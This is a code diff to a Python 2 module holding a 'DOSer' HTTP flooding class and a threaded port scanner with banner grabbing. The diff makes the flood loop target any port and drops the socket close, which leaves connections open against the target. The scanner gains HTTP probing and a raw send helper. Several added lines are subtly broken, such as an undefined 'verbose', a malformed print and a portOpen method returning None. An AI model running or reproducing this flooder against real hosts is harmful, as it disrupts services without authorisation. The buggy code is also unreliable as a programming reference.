@@ -52,16 +52,15 @@ class DOSer:
         self.start_time = 0
         self.time_length = 1
 
-    def _attack(self, target):  
+    def _attack(self, target, port=80):  
         #pid = os.fork()
         while int(time.time()) < self.start_time + self.time_length:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             try:
-                s.connect((self.target, 80))
+                s.connect((self.target, port))
                 s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
-                s.send("Host: " + self.target  + "\r\n\r\n");  
-                s.close()
+                s.send("Host: " + self.target  + "\r\n\r\n")
             except: pass
 
     def _threader(self):
@@ -98,18 +97,42 @@ class PortScanner:
         self.IP = '127.0.0.1'
         self.port_range = '1025'
         self.print_lock = threading.Lock()
-        self.timeout = 1
+        self.timeout = 2
+        self.openlist = []
+        self.verbose = True
 
     def _portscan(self, port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(self.timeout)
         try:
             con = s.connect((self.IP,port))
-            with self.print_lock:
-                print 'Port', port, 'is open.'
-            con.close()
-        except:
-            pass
+            response = s.recv(1024)
+            self.openlist.append(port)
+            if verbose:
+                with self.print_lock:
+                    print 'Port', port, + ':'
+                    print response
+            s.close()
+
+        except Exception, e:
+            httplist = [80, 443, 2082, 2083]
+            if port in httplist:
+                try:
+                    s.send('GET HTTP/1.1 \r\n')
+                    response = s.recv(1024)
+                    self.openlist.append(port)
+                    if verbose:
+                        with self.print_lock:
+                            print 'Port', port + ':'
+                            print response
+                    s.close()
+                except: pass
+                
+    def portOpen(self, port):
+        if port in self.openlist:
+            return
+        else:
+            return False
         
     def _threader(self):
         while True:
@@ -117,9 +140,10 @@ class PortScanner:
             self._portscan(self.worker)
             self.q.task_done()
 
-    def scan(self, IP, port_range = 1025, timeout = 1):
+    def scan(self, IP, port_range = 1025, timeout = 1, verbose = True):
         '''Scans ports of an IP address. Use getIP() to find IP address of host.
         '''
+        self.openlist = []
         self.IP = IP
         self.port_range = port_range
         self.timeout = 1
@@ -136,4 +160,12 @@ class PortScanner:
         
 def getIP(host):
     return socket.gethostbyname(host)
+
+def send(IP, port, message):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connection = s.connect((IP, port))
+    s.send(message)
+    response = s.recv(1024)
+    s.close()
+    return response
 
